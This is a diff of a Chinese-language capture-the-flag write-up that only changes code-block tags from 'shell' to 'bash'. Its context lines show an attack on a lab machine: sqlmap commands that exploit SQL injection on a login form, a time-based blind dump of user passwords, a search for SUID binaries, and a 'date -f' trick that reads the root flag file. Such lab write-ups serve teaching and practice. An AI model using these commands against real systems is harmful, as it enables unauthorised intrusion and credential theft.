@@ -2,7 +2,7 @@
 
 ## 信息搜集
 
-```shell
+```bash
 # 直接 netstat -anopt 看本机的就行
 # 核心 80 端口
 ```
@@ -138,7 +138,7 @@ var x3=sta3.indexOf(' ');
 
 很明显的 sql 注入
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sqlmap -u http://10.10.110.101/police/userlogin.php --form --batch
         ___
@@ -213,7 +213,7 @@ back-end DBMS: MySQL >= 5.0.12
 
 没有明显的结果回显，也没有报错，只能上时间盲注，可以得到用户密码
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~]
 └─$ sqlmap -u 10.10.110.101/police/userlogin.php --form --batch -D crime_portal -T user -C u_pass --dump --fresh-queries --time-sec=1
         ___
@@ -278,7 +278,7 @@ Table: user
 
 检查suid文件
 
-```shell
+```bash
 eddie@htb:/var/www/html/police$ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/openssh/ssh-keysign
 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
@@ -319,7 +319,7 @@ eddie@htb:/var/www/html/police$ find / -perm -u=s -type f 2>/dev/null
 
 直接使用`date`构造文件读取
 
-```shell
+```bash
 (remote) eddie@htb:/home/eddie$ date -f /root/flag.txt
 date: invalid date ‘8c19c5d86369eb35fdfeefe468281fa8’
 ```
